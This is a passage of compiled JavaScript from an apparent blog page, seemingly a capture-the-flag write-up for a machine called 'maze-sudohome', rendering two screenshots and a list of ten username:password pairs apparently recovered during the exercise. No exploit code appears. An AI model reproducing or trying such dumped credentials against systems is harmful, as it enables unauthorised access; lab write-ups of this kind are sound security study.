"),a("p",[a("img",{attrs:{src:"/medias/maze-sudohome/26.png",alt:""}})]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-sudohome/27.png",alt:""}})]),s._v(" "),a("p",[s._v("user1:0woA8Sr7I83R0ZwmnTcH"),a("br"),s._v("\nuser2:tLPi3BLMG2zmwvZ5z9rh"),a("br"),s._v("\nuser3:TFqxDyfGO69DP1lyjt0f"),a("br"),s._v("\nuser4:B0aWh2XHpp5hOIVtCUbn"),a("br"),s._v("\nuser5:GZ5KErjFycaYHZGj7GcI"),a("br"),s._v("\nuser6:LowGbJGVAxhQw63UWc5Z"),a("br"),s._v("\nuser7:HLoKAOu86miWIYKdyVx3"),a("br"),s._v("\nuser8:UxeGoUq8xqBRxyWVQPYK"),a("br"),s._v("\nuser9:peqkSBCDKvVxxNwcq1j4"),a("br"),s._v("\nuser10:morrinsville")])])}),[],!1,null,null,null);a.default=r.exports}}]);